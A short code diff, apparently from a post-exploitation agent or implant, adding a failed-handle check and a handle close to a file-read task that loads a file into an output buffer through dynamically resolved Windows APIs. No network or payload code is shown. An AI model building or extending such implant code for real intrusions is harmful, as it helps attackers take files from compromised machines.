@@ -614,12 +614,15 @@ auto DECLFN Task::FileSystem(
             ULONG  FileSize   = 0;
             BYTE*  FileBuffer = { 0 };
             HANDLE FileHandle = Self->Krnl32.CreateFileA( PathName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
-
+            if (FileHandle == INVALID_HANDLE_VALUE) 
+            {
+                break;
+            }
             FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
             FileBuffer = B_PTR( hAlloc( FileSize ) );
 
             Success = Self->Krnl32.ReadFile( FileHandle, FileBuffer, FileSize, &TmpVal, 0 );
-
+            Self->Ntdll.NtClose( FileHandle );
             Buffer = FileBuffer;
             TmpVal = FileSize; 
 
